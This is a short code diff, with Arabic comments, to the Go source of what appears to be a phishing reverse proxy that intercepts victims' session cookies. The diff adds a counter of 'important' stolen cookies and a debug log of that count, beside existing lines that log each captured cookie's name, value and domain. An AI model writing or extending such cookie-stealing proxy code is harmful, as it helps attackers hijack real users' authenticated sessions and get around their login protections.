@@ -83,6 +83,8 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	importantCookieCount int // متغير لحفظ عدد الكوكيز المهمة
+
 }
 
 type ProxySession struct {
@@ -1222,6 +1224,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							// طباعة معلومات أكثر تفصيلاً للكوكيز المهمة
 							if isImportantCookie {
 								log.Success("[%d] تم اعتراض كوكي مهم: %s = %s (Domain: %s)", ps.Index, ck.Name, ck.Value, c_domain)
+								p.importantCookieCount++
+		log.Debug("عدد الكوكيز المهمة: %d", p.importantCookieCount)
+
 							} else {
 								log.Success("[%d] تم اعتراض كوكي: %s = %s", ps.Index, ck.Name, ck.Value)
 							}
